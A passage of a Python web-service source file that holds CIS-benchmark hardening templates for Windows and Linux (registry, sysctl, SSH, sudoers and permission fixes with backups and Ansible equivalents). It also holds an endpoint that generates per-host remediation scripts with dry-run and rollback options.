            "- name: '[WIN-CIS-2.3.11.7] Enforce NTLMv2 Only and Refuse LM & NTLMv1 (Level 5)'\n"
            "  ansible.windows.win_regedit:\n"
            "    path: HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\n"
            "    name: LmCompatibilityLevel\n"
            "    data: 5\n"
            "    type: dword"
        ),
    },
    "WIN-CIS-18.9.47.1": {
        "backup": r'reg export "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" "$BackupDir\WIN-CIS-18.9.47.1.reg" /y 2>$null',
        "apply": 'Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa" -Name "RunAsPPL" -Value 1 -Type DWord -Force',
        "ansible": (
            "- name: '[WIN-CIS-18.9.47.1] Enable LSASS Protected Process Light (RunAsPPL=1)'\n"
            "  ansible.windows.win_regedit:\n"
            "    path: HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\n"
            "    name: RunAsPPL\n"
            "    data: 1\n"
            "    type: dword"
        ),
    },
    "WIN-CIS-18.10.57.1": {
        "backup": r'reg export "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" "$BackupDir\WIN-CIS-18.10.57.1.reg" /y 2>$null',
        "apply": (
            'New-Item -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging" -Force | Out-Null\n'
            'Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1 -Type DWord -Force'
        ),
        "ansible": (
            "- name: '[WIN-CIS-18.10.57.1] Enable PowerShell Script Block Logging (Event ID 4104)'\n"
            "  ansible.windows.win_regedit:\n"
            "    path: HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\n"
            "    name: EnableScriptBlockLogging\n"
            "    data: 1\n"
            "    type: dword"
        ),
    },
    "WIN-CIS-2.3.1.2": {
        "backup": 'Get-LocalUser -Name "Guest" -ErrorAction SilentlyContinue | Select-Object Name,Enabled | ConvertTo-Json > "$BackupDir\\WIN-CIS-2.3.1.2.json"',
        "apply": 'Disable-LocalUser -Name "Guest" -ErrorAction SilentlyContinue; net user Guest /active:no 2>$null',
        "ansible": (
            "- name: '[WIN-CIS-2.3.1.2] Ensure Built-in Guest Account is Disabled'\n"
            "  ansible.windows.win_user:\n"
            "    name: Guest\n"
            "    account_disabled: true"
        ),
    },
    "WIN-CIS-18.9.102.2": {
        "backup": r'reg export "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" "$BackupDir\WIN-CIS-18.9.102.2.reg" /y 2>$null',
        "apply": 'Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp" -Name "UserAuthentication" -Value 1 -Type DWord -Force',
        "ansible": (
            "- name: '[WIN-CIS-18.9.102.2] Enforce RDP Network Level Authentication (NLA)'\n"
            "  ansible.windows.win_regedit:\n"
            "    path: 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp'\n"
            "    name: UserAuthentication\n"
            "    data: 1\n"
            "    type: dword"
        ),
    },
    "WIN-CIS-18.9.10.1": {
        "backup": 'Confirm-SecureBootUEFI 2>$null | Out-File "$BackupDir\\WIN-CIS-18.9.10.1.txt"',
        "apply": 'Write-Warning "[WIN-CIS-18.9.10.1] Wymagana aktywacja UEFI Secure Boot w ustawieniach firmware płyty głównej (BIOS/UEFI)."',
        "ansible": (
            "- name: '[WIN-CIS-18.9.10.1] Verify UEFI Secure Boot State'\n"
            "  ansible.windows.win_powershell:\n"
            "    script: Confirm-SecureBootUEFI"
        ),
    },
    "WIN-NET-SURFACE-01": {
        "backup": 'Get-NetFirewallRule -DisplayName "CIS-Block-Legacy-Cleartext-Ports" -ErrorAction SilentlyContinue | Out-File "$BackupDir\\WIN-NET-SURFACE-01.txt"',
        "apply": 'New-NetFirewallRule -DisplayName "CIS-Block-Legacy-Cleartext-Ports" -Direction Inbound -LocalPort 21,23,69,513,514 -Protocol TCP -Action Block -Force',
        "ansible": (
            "- name: '[WIN-NET-SURFACE-01] Block Legacy Cleartext TCP Ports (21,23,69,513,514)'\n"
            "  community.windows.win_firewall_rule:\n"
            "    name: CIS-Block-Legacy-Cleartext-Ports\n"
            "    localport: '21,23,69,513,514'\n"
            "    action: block\n"
            "    direction: in\n"
            "    protocol: tcp\n"
            "    state: present\n"
            "    enabled: yes"
        ),
    },
    "WIN-CIS-18.9.30.2": {
        "backup": r'reg export "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" "$BackupDir\WIN-CIS-18.9.30.2.reg" /y 2>$null',
        "apply": (
            'New-Item -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\DNSClient" -Force | Out-Null\n'
            'Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\DNSClient" -Name "EnableMulticast" -Value 0 -Type DWord -Force'
        ),
        "ansible": (
            "- name: '[WIN-CIS-18.9.30.2] Disable LLMNR Multicast Name Resolution'\n"
            "  ansible.windows.win_regedit:\n"
            "    path: HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\DNSClient\n"
            "    name: EnableMulticast\n"
            "    data: 0\n"
            "    type: dword"
        ),
    },
    "WIN-CIS-2.3.7.4": {
        "backup": r'reg export "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" "$BackupDir\WIN-CIS-2.3.7.4.reg" /y 2>$null',
        "apply": 'Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters" -Name "RequireSecuritySignature" -Value 1 -Type DWord -Force',
        "ansible": (
            "- name: '[WIN-CIS-2.3.7.4] Require SMB Client Digitally Signed Communications'\n"
            "  ansible.windows.win_regedit:\n"
            "    path: HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters\n"
            "    name: RequireSecuritySignature\n"
            "    data: 1\n"
            "    type: dword"
        ),
    },
    "WIN-CIS-18.9.5.1": {
        "backup": r'reg export "HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" "$BackupDir\WIN-CIS-18.9.5.1.reg" /y 2>$null',
        "apply": 'Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue; Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 0 -Type DWord -Force',
        "ansible": (
            "- name: '[WIN-CIS-18.9.5.1] Enable Windows Defender Real-time Protection'\n"
            "  ansible.windows.win_powershell:\n"
            "    script: Set-MpPreference -DisableRealtimeMonitoring $false"
        ),
    },
    "WIN-CIS-18.8.19.2": {
        "backup": r'reg export "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" "$BackupDir\WIN-CIS-18.8.19.2.reg" /y 2>$null',
        "apply": (
            'New-Item -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services" -Force | Out-Null\n'
            'Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services" -Name "DisablePasswordSaving" -Value 1 -Type DWord -Force'
        ),
        "ansible": (
            "- name: '[WIN-CIS-18.8.19.2] Do Not Allow RDP Passwords to Be Saved'\n"
            "  ansible.windows.win_regedit:\n"
            "    path: HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services\n"
            "    name: DisablePasswordSaving\n"
            "    data: 1\n"
            "    type: dword"
        ),
    },
    "WIN-CIS-18.5.11.2": {
        "backup": r'reg export "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" "$BackupDir\WIN-CIS-18.5.11.2.reg" /y 2>$null',
        "apply": 'Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" -Name "NoDriveTypeAutoRun" -Value 255 -Type DWord -Force',
        "ansible": (
            "- name: '[WIN-CIS-18.5.11.2] Turn Off Autoplay on All Drives'\n"
            "  ansible.windows.win_regedit:\n"
            "    path: HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\n"
            "    name: NoDriveTypeAutoRun\n"
            "    data: 255\n"
            "    type: dword"
        ),
    },
    "WIN-CIS-18.9.15.1": {
        "backup": 'manage-bde.exe -status C: > "$BackupDir\\WIN-CIS-18.9.15.1-status.txt"',
        "apply": 'Enable-BitLocker -MountPoint "C:" -EncryptionMethod XtsAes256 -UsedSpaceOnly -TpmProtector -ErrorAction SilentlyContinue',
        "ansible": (
            "- name: '[WIN-CIS-18.9.15.1] Enable BitLocker on System Volume C:'\n"
            "  ansible.windows.win_powershell:\n"
            "    script: Enable-BitLocker -MountPoint 'C:' -EncryptionMethod XtsAes256 -UsedSpaceOnly -TpmProtector"
        ),
    },
    "WIN-CIS-2.3.1.5": {
        "backup": 'Get-LocalUser -Name "Administrator" -ErrorAction SilentlyContinue | Select-Object Name,Enabled | ConvertTo-Json > "$BackupDir\\WIN-CIS-2.3.1.5.json"',
        "apply": 'Disable-LocalUser -Name "Administrator" -ErrorAction SilentlyContinue; net user Administrator /active:no 2>$null',
        "ansible": (
            "- name: '[WIN-CIS-2.3.1.5] Ensure Built-in Administrator Account is Disabled'\n"
            "  ansible.windows.win_user:\n"
            "    name: Administrator\n"
            "    account_disabled: true"
        ),
    },
    "WIN-CIS-18.9.84.1": {
        "backup": r'reg export "HKLM\SOFTWARE\Policies\Microsoft\Windows\WinRM\Client" "$BackupDir\WIN-CIS-18.9.84.1.reg" /y 2>$null',
        "apply": (
            'New-Item -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\Client" -Force | Out-Null\n'
            'Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\Client" -Name "AllowBasic" -Value 0 -Type DWord -Force\n'
            'New-Item -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\Service" -Force | Out-Null\n'
            'Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\Service" -Name "AllowBasic" -Value 0 -Type DWord -Force'
        ),
        "ansible": (
            "- name: '[WIN-CIS-18.9.84.1] Disable WinRM Basic Authentication'\n"
            "  ansible.windows.win_regedit:\n"
            "    path: HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\Client\n"
            "    name: AllowBasic\n"
            "    data: 0\n"
            "    type: dword"
        ),
    },
    "WIN-CIS-18.9.102.3": {
        "backup": r'reg export "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" "$BackupDir\WIN-CIS-18.9.102.3.reg" /y 2>$null',
        "apply": 'Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "InactivityTimeoutSecs" -Value 900 -Type DWord -Force',
        "ansible": (
            "- name: '[WIN-CIS-18.9.102.3] Set Machine Inactivity Limit to 900s (15 min)'\n"
            "  ansible.windows.win_regedit:\n"
            "    path: HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\n"
            "    name: InactivityTimeoutSecs\n"
            "    data: 900\n"
            "    type: dword"
        ),
    },
    "WIN-CIS-18.4.1": {
        "backup": r'reg export "HKLM\SOFTWARE\Policies\Microsoft\Cryptography" "$BackupDir\WIN-CIS-18.4.1.reg" /y 2>$null',
        "apply": (
            'New-Item -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Cryptography" -Force | Out-Null\n'
            'Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Cryptography" -Name "ForceKeyProtection" -Value 2 -Type DWord -Force'
        ),
        "ansible": (
            "- name: '[WIN-CIS-18.4.1] Enforce Strong Private Key Protection for Stored Certificates'\n"
            "  ansible.windows.win_regedit:\n"
            "    path: HKLM:\\SOFTWARE\\Policies\\Microsoft\\Cryptography\n"
            "    name: ForceKeyProtection\n"
            "    data: 2\n"
            "    type: dword"
        ),
    },
}

LINUX_REMEDIATION_TEMPLATES: Dict[str, Dict[str, str]] = {
    "LNX-CIS-5.2.8": {
        "backup": 'cp -p /etc/ssh/sshd_config "$BACKUP_DIR/sshd_config.bak" 2>/dev/null || true',
        "apply": (
            'sed -i -E "s/^#?PermitRootLogin.*/PermitRootLogin no/" /etc/ssh/sshd_config\n'
            'grep -q "^PermitRootLogin no" /etc/ssh/sshd_config || echo "PermitRootLogin no" >> /etc/ssh/sshd_config\n'
            "systemctl reload sshd 2>/dev/null || service ssh reload 2>/dev/null || true"
        ),
        "ansible": (
            "- name: '[LNX-CIS-5.2.8] Disable SSH Root Login'\n"
            "  ansible.builtin.lineinfile:\n"
            "    path: /etc/ssh/sshd_config\n"
            "    regexp: '^#?PermitRootLogin'\n"
            "    line: 'PermitRootLogin no'\n"
            "    validate: 'sshd -t -f %s'"
        ),
    },
    "LNX-CIS-3.1.1": {
        "backup": 'sysctl net.ipv4.ip_forward > "$BACKUP_DIR/LNX-CIS-3.1.1.sysctl"',
        "apply": (
            'echo "net.ipv4.ip_forward = 0" > /etc/sysctl.d/60-cis-ipforward.conf\n'
            "sysctl -w net.ipv4.ip_forward=0"
        ),
        "ansible": (
            "- name: '[LNX-CIS-3.1.1] Disable IPv4 Packet Forwarding'\n"
            "  ansible.posix.sysctl:\n"
            "    name: net.ipv4.ip_forward\n"
            "    value: '0'\n"
            "    state: present\n"
            "    reload: true"
        ),
    },
    "LNX-CIS-3.3.5": {
        "backup": 'sysctl net.ipv4.conf.all.accept_redirects net.ipv4.conf.default.accept_redirects > "$BACKUP_DIR/LNX-CIS-3.3.5.sysctl"',
        "apply": (
            'printf "net.ipv4.conf.all.accept_redirects = 0\\nnet.ipv4.conf.default.accept_redirects = 0\\n" > /etc/sysctl.d/60-cis-redirects.conf\n'
            "sysctl -w net.ipv4.conf.all.accept_redirects=0 net.ipv4.conf.default.accept_redirects=0"
        ),
        "ansible": (
            "- name: '[LNX-CIS-3.3.5] Disable ICMP Redirect Acceptance'\n"
            "  ansible.posix.sysctl:\n"
            "    name: '{{ item }}'\n"
            "    value: '0'\n"
            "    state: present\n"
            "    reload: true\n"
            "  loop:\n"
            "    - net.ipv4.conf.all.accept_redirects\n"
            "    - net.ipv4.conf.default.accept_redirects"
        ),
    },
    "LNX-CIS-6.1.10": {
        "backup": 'stat -c "%a %U:%G" /etc/shadow > "$BACKUP_DIR/LNX-CIS-6.1.10.stat"',
        "apply": "chown root:shadow /etc/shadow && chmod 0640 /etc/shadow",
        "ansible": (
            "- name: '[LNX-CIS-6.1.10] Harden /etc/shadow Permissions (0640 root:shadow)'\n"
            "  ansible.builtin.file:\n"
            "    path: /etc/shadow\n"
            "    owner: root\n"
            "    group: shadow\n"
            "    mode: '0640'"
        ),
    },
    "LNX-CIS-1.5.1": {
        "backup": 'sysctl kernel.randomize_va_space > "$BACKUP_DIR/LNX-CIS-1.5.1.sysctl"',
        "apply": (
            'echo "kernel.randomize_va_space = 2" > /etc/sysctl.d/60-cis-aslr.conf\n'
            "sysctl -w kernel.randomize_va_space=2"
        ),
        "ansible": (
            "- name: '[LNX-CIS-1.5.1] Enable Full Kernel ASLR (randomize_va_space=2)'\n"
            "  ansible.posix.sysctl:\n"
            "    name: kernel.randomize_va_space\n"
            "    value: '2'\n"
            "    state: present\n"
            "    reload: true"
        ),
    },
    "LNX-CIS-4.1.1.1": {
        "backup": 'systemctl is-active auditd > "$BACKUP_DIR/LNX-CIS-4.1.1.1.state" 2>/dev/null || true',
        "apply": "apt-get update -y && apt-get install -y auditd && systemctl enable --now auditd",
        "ansible": (
            "- name: '[LNX-CIS-4.1.1.1] Ensure auditd Daemon is Installed and Active'\n"
            "  ansible.builtin.service:\n"
            "    name: auditd\n"
            "    state: started\n"
            "    enabled: true"
        ),
    },
    "LNX-CIS-6.2.5": {
        "backup": 'cp -p /etc/passwd "$BACKUP_DIR/passwd.bak"',
        "apply": 'awk -F: \'($3 == 0 && $1 != "root") { print $1 }\' /etc/passwd | xargs -r -I{} usermod -L {}',
        "ansible": (
            "- name: '[LNX-CIS-6.2.5] Lock Non-Root Accounts with UID 0'\n"
            "  ansible.builtin.shell: awk -F: '($3 == 0 && $1 != \"root\") { print $1 }' /etc/passwd | xargs -r -I{} usermod -L {}"
        ),
    },
    "LNX-CIS-5.3.3": {
        "backup": 'cp -r /etc/sudoers /etc/sudoers.d "$BACKUP_DIR/" 2>/dev/null || true',
        "apply": 'sed -i "s/NOPASSWD://g" /etc/sudoers /etc/sudoers.d/* 2>/dev/null || true',
        "ansible": (
            "- name: '[LNX-CIS-5.3.3] Remove NOPASSWD Directives from sudoers'\n"
            "  ansible.builtin.replace:\n"
            "    path: /etc/sudoers\n"
            "    regexp: 'NOPASSWD:'\n"
            "    replace: ''\n"
            "    validate: 'visudo -cf %s'"
        ),
    },
    "LNX-CIS-1.4.1": {
        "backup": 'stat -c "%a %U:%G" /boot/grub/grub.cfg > "$BACKUP_DIR/LNX-CIS-1.4.1.stat" 2>/dev/null || true',
        "apply": "chown root:root /boot/grub/grub.cfg && chmod 0600 /boot/grub/grub.cfg",
        "ansible": (
            "- name: '[LNX-CIS-1.4.1] Harden Bootloader /boot/grub/grub.cfg Permissions (0600 root:root)'\n"
            "  ansible.builtin.file:\n"
            "    path: /boot/grub/grub.cfg\n"
            "    owner: root\n"
            "    group: root\n"
            "    mode: '0600'"
        ),
    },
    "LNX-NET-SURFACE-01": {
        "backup": 'ss -tulpn > "$BACKUP_DIR/LNX-NET-SURFACE-01-ports.txt"',
        "apply": "systemctl stop telnet.socket vsftpd rsh.socket 2>/dev/null || true; systemctl disable telnet.socket vsftpd rsh.socket 2>/dev/null || true",
        "ansible": (
            "- name: '[LNX-NET-SURFACE-01] Disable Legacy Cleartext Network Daemons (Telnet/FTP/RSH)'\n"
            "  ansible.builtin.systemd:\n"
            "    name: '{{ item }}'\n"
            "    state: stopped\n"
            "    enabled: false\n"
            "  failed_when: false\n"
            "  loop: [telnet.socket, vsftpd.service, rsh.socket]"
        ),
    },
    "LNX-CIS-1.6.1": {
        "backup": 'aa-status > "$BACKUP_DIR/LNX-CIS-1.6.1.status" 2>/dev/null || true',
        "apply": "systemctl enable --now apparmor 2>/dev/null || true; aa-enforce /etc/apparmor.d/* 2>/dev/null || true",
        "ansible": (
            "- name: '[LNX-CIS-1.6.1] Ensure AppArmor is Enabled and Active'\n"
            "  ansible.builtin.service:\n"
            "    name: apparmor\n"
            "    state: started\n"
            "    enabled: true"
        ),
    },
    "LNX-CIS-3.3.1": {
        "backup": 'sysctl net.ipv4.conf.all.accept_source_route net.ipv4.conf.default.accept_source_route > "$BACKUP_DIR/LNX-CIS-3.3.1.sysctl"',
        "apply": (
            'printf "net.ipv4.conf.all.accept_source_route = 0\\nnet.ipv4.conf.default.accept_source_route = 0\\n" > /etc/sysctl.d/60-cis-source-route.conf\n'
            "sysctl -w net.ipv4.conf.all.accept_source_route=0 net.ipv4.conf.default.accept_source_route=0"
        ),
        "ansible": (
            "- name: '[LNX-CIS-3.3.1] Disable IP Source Routed Packets'\n"
            "  ansible.posix.sysctl:\n"
            "    name: '{{ item }}'\n"
            "    value: '0'\n"
            "    state: present\n"
            "    reload: true\n"
            "  loop:\n"
            "    - net.ipv4.conf.all.accept_source_route\n"
            "    - net.ipv4.conf.default.accept_source_route"
        ),
    },
    "LNX-CIS-3.3.2": {
        "backup": 'sysctl net.ipv4.tcp_syncookies > "$BACKUP_DIR/LNX-CIS-3.3.2.sysctl"',
        "apply": (
            'echo "net.ipv4.tcp_syncookies = 1" > /etc/sysctl.d/60-cis-syncookies.conf\n'
            "sysctl -w net.ipv4.tcp_syncookies=1"
        ),
        "ansible": (
            "- name: '[LNX-CIS-3.3.2] Enable TCP SYN Cookies'\n"
            "  ansible.posix.sysctl:\n"
            "    name: net.ipv4.tcp_syncookies\n"
            "    value: '1'\n"
            "    state: present\n"
            "    reload: true"
        ),
    },
    "LNX-CIS-5.4.1.1": {
        "backup": 'cp -p /etc/login.defs "$BACKUP_DIR/login.defs.bak"',
        "apply": (
            'sed -i -E "s/^#?ENCRYPT_METHOD.*/ENCRYPT_METHOD YESCRYPT/" /etc/login.defs\n'
            'grep -q "^ENCRYPT_METHOD YESCRYPT" /etc/login.defs || echo "ENCRYPT_METHOD YESCRYPT" >> /etc/login.defs'
        ),
        "ansible": (
            "- name: '[LNX-CIS-5.4.1.1] Set Password Hashing Algorithm to YESCRYPT in /etc/login.defs'\n"
            "  ansible.builtin.lineinfile:\n"
            "    path: /etc/login.defs\n"
            "    regexp: '^#?ENCRYPT_METHOD'\n"
            "    line: 'ENCRYPT_METHOD YESCRYPT'"
        ),
    },
    "LNX-CIS-5.2.10": {
        "backup": 'cp -p /etc/ssh/sshd_config "$BACKUP_DIR/sshd_config.bak" 2>/dev/null || true',
        "apply": (
            'sed -i -E "s/^#?PasswordAuthentication.*/PasswordAuthentication no/" /etc/ssh/sshd_config\n'
            'grep -q "^PasswordAuthentication no" /etc/ssh/sshd_config || echo "PasswordAuthentication no" >> /etc/ssh/sshd_config\n'
            "systemctl reload sshd 2>/dev/null || true"
        ),
        "ansible": (
            "- name: '[LNX-CIS-5.2.10] Disable SSH Password Authentication'\n"
            "  ansible.builtin.lineinfile:\n"
            "    path: /etc/ssh/sshd_config\n"
            "    regexp: '^#?PasswordAuthentication'\n"
            "    line: 'PasswordAuthentication no'\n"
            "    validate: 'sshd -t -f %s'"
        ),
    },
    "LNX-CIS-1.7.1": {
        "backup": 'sysctl fs.suid_dumpable > "$BACKUP_DIR/LNX-CIS-1.7.1.sysctl"',
        "apply": (
            'echo "fs.suid_dumpable = 0" > /etc/sysctl.d/60-cis-suiddump.conf\n'
            "sysctl -w fs.suid_dumpable=0"
        ),
        "ansible": (
            "- name: '[LNX-CIS-1.7.1] Restrict Core Dumps of SUID Programs (fs.suid_dumpable = 0)'\n"
            "  ansible.posix.sysctl:\n"
            "    name: fs.suid_dumpable\n"
            "    value: '0'\n"
            "    state: present\n"
            "    reload: true"
        ),
    },
    "LNX-CIS-5.1.1": {
        "backup": 'stat -c "%a %U:%G" /etc/crontab > "$BACKUP_DIR/LNX-CIS-5.1.1.stat" 2>/dev/null || true',
        "apply": "chown root:root /etc/crontab && chmod 0600 /etc/crontab",
        "ansible": (
            "- name: '[LNX-CIS-5.1.1] Harden /etc/crontab Permissions (0600 root:root)'\n"
            "  ansible.builtin.file:\n"
            "    path: /etc/crontab\n"
            "    owner: root\n"
            "    group: root\n"
            "    mode: '0600'"
        ),
    },
    "LNX-CIS-3.2.2": {
        "backup": 'sysctl net.ipv4.icmp_echo_ignore_broadcasts > "$BACKUP_DIR/LNX-CIS-3.2.2.sysctl"',
        "apply": (
            'echo "net.ipv4.icmp_echo_ignore_broadcasts = 1" > /etc/sysctl.d/60-cis-broadcasts.conf\n'
            "sysctl -w net.ipv4.icmp_echo_ignore_broadcasts=1"
        ),
        "ansible": (
            "- name: '[LNX-CIS-3.2.2] Ignore ICMP Broadcast Echo Requests (Smurf Protection)'\n"
            "  ansible.posix.sysctl:\n"
            "    name: net.ipv4.icmp_echo_ignore_broadcasts\n"
            "    value: '1'\n"
            "    state: present\n"
            "    reload: true"
        ),
    },
    "LNX-CIS-3.2.4": {
        "backup": 'sysctl net.ipv4.conf.all.log_martians net.ipv4.conf.default.log_martians > "$BACKUP_DIR/LNX-CIS-3.2.4.sysctl"',
        "apply": (
            'printf "net.ipv4.conf.all.log_martians = 1\\nnet.ipv4.conf.default.log_martians = 1\\n" > /etc/sysctl.d/60-cis-martians.conf\n'
            "sysctl -w net.ipv4.conf.all.log_martians=1 net.ipv4.conf.default.log_martians=1"
        ),
        "ansible": (
            "- name: '[LNX-CIS-3.2.4] Log Suspicious Packets (Martians)'\n"
            "  ansible.posix.sysctl:\n"
            "    name: '{{ item }}'\n"
            "    value: '1'\n"
            "    state: present\n"
            "    reload: true\n"
            "  loop:\n"
            "    - net.ipv4.conf.all.log_martians\n"
            "    - net.ipv4.conf.default.log_martians"
        ),
    },
    "LNX-CIS-5.4.4": {
        "backup": 'cp -p /etc/login.defs "$BACKUP_DIR/login.defs.bak"',
        "apply": (
            'sed -i -E "s/^#?UMASK.*/UMASK 027/" /etc/login.defs\n'
            'grep -q "^UMASK 027" /etc/login.defs || echo "UMASK 027" >> /etc/login.defs'
        ),
        "ansible": (
            "- name: '[LNX-CIS-5.4.4] Enforce Default umask 027 in /etc/login.defs'\n"
            "  ansible.builtin.lineinfile:\n"
            "    path: /etc/login.defs\n"
            "    regexp: '^#?UMASK'\n"
            "    line: 'UMASK 027'"
        ),
    },
}


@app.get("/api/v1/agents/{agent_id}/remediation-script")
async def generate_host_remediation_script(agent_id: str, format: str = "auto") -> Dict[str, Any]:
    """
    Generuje skrypt naprawczy Auto-Remediation (PowerShell .ps1 / Bash .sh / Ansible Playbook .yml)
    szyty na miarę wyłącznie dla wykrytych niezgodności (`FAIL` / `ERROR`) danego hosta.
    Zawiera automatyczny backup stanu początkowego oraz flagi `-DryRun` i `-Rollback`.
    """
    agent = db.get_agent(agent_id)
    if not agent:
        raise HTTPException(status_code=404, detail="Nie znaleziono hosta.")
    latest = db.get_latest_report_for_agent(agent_id, include_quarantined=True)
    if not latest:
        raise HTTPException(status_code=404, detail="Brak raportu audytowego dla tego hosta.")

    os_fam = agent["os_family"].lower()
    failed_items = [
        r for r in latest.get("evaluated_results", [])
        if r.get("compliance_status") in ("FAIL", "ERROR")
    ]

    if format == "auto":
        format = "ps1" if os_fam == "windows" else "sh"

    now_str = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    hostname = agent["hostname"]

    if format == "ansible":
        lines = [
            "# ==============================================================================",
            f"# SystemAuditor Enterprise — Ansible Auto-Remediation Playbook",
            f"# Target Host: {hostname} ({agent_id}) | OS: {agent['os_release']}",
            f"# Generated:   {now_str} | Failed CIS Checks: {len(failed_items)}",
            "# ==============================================================================",
            "---",
            f"- name: 'CIS Benchmark Hardening & Remediation for {hostname}'",
            f"  hosts: {hostname}",
            f"  become: {'false' if os_fam == 'windows' else 'true'}",
            "  tasks:",
        ]
        if not failed_items:
            lines.append("    - name: 'All CIS checks passed — no remediation required'")
            lines.append("      ansible.builtin.debug:")
            lines.append("        msg: 'Host is 100% compliant with CIS baseline.'")
        else:
            for item in failed_items:
                rid = item["rule_id"]
                tpl = (WINDOWS_REMEDIATION_TEMPLATES if os_fam == "windows" else LINUX_REMEDIATION_TEMPLATES).get(rid)
                if tpl and "ansible" in tpl:
                    for l in tpl["ansible"].splitlines():
                        lines.append(f"    {l}")
                else:
                    lines.append(f"    # [{rid}] {item.get('title')}")
                    lines.append(f"    # Remediation: {item.get('remediation')}")
        script_content = "\n".join(lines) + "\n"
        filename = f"remediate-{hostname}.yml"

    elif os_fam == "windows" or format == "ps1":
        lines = [
            "#Requires -RunAsAdministrator",
            "# ==============================================================================",
            f"# SystemAuditor Enterprise — Skrypt Auto-Remediacji CIS (PowerShell)",
            f"# Host docelowy: {hostname} ({agent_id}) | OS: {agent['os_release']}",
            f"# Wygenerowano:  {now_str} | Wykryte luki (FAIL): {len(failed_items)}",
            "# Obsługuje:     -DryRun (podgląd zmian) oraz -Rollback (przywrócenie kopii .reg)",
            "# ==============================================================================",
            "param(",
            "    [switch]$DryRun,",
            "    [switch]$Rollback,",
            '    [string]$BackupDir = "C:\\ProgramData\\SystemAuditor\\Backups\\Latest"',
            ")",
            '$ErrorActionPreference = "Continue"',
            "",
            "if ($Rollback) {",
            '    Write-Host "[ROLLBACK] Przywracanie kopii zapasowej rejestru z $BackupDir ..." -ForegroundColor Yellow',
            '    Get-ChildItem -Path $BackupDir -Filter "*.reg" -ErrorAction SilentlyContinue | ForEach-Object {',
            '        Write-Host " -> Importowanie $($_.FullName)" -ForegroundColor Cyan',
            '        reg import $_.FullName',
            "    }",
            '    Write-Host "[OK] Rollback zakończony pomyślnie." -ForegroundColor Green',
            "    exit 0",
            "}",
            "",
            "New-Item -ItemType Directory -Force -Path $BackupDir | Out-Null",
            f'Write-Host "=== Rozpoczynanie utwardzania CIS dla {hostname} ({len(failed_items)} reguł) ===" -ForegroundColor Cyan',
            "",
        ]
        for idx, item in enumerate(failed_items, 1):
            rid = item["rule_id"]
            tpl = WINDOWS_REMEDIATION_TEMPLATES.get(rid, {})
            bkp = tpl.get("backup", "# Brak klucza do eksportu")
            app_cmd = tpl.get("apply", f"# Wykonaj ręcznie: {item.get('remediation', '')}")
            lines.extend([
                f"# ------------------------------------------------------------------------------",
                f"# [{idx}/{len(failed_items)}] {rid} ({item.get('risk_severity')}) — {item.get('title')}",
                f"# Obecna wartość: {json.dumps(item.get('observed_value'), ensure_ascii=False)} | Wymagane: {item.get('expected_summary')}",
                f"# ------------------------------------------------------------------------------",
                f'Write-Host "[{idx}/{len(failed_items)}] Naprawa {rid}: {item.get("title")}..." -ForegroundColor Yellow',
                "if ($DryRun) {",
                f'    Write-Host " [DRY-RUN] Zostanie wykonane: {rid}" -ForegroundColor Gray',
                "} else {",
                f"    {bkp}",
                f"    {app_cmd}",
                f'    Write-Host " [OK] Utwardzono {rid}" -ForegroundColor Green',
                "}",
                "",
            ])
        lines.append('Write-Host "=== Zakończono Auto-Remediację CIS! Uruchom ponownie skan Agenta, aby zweryfikować wynik 100% PASS. ===" -ForegroundColor Green')
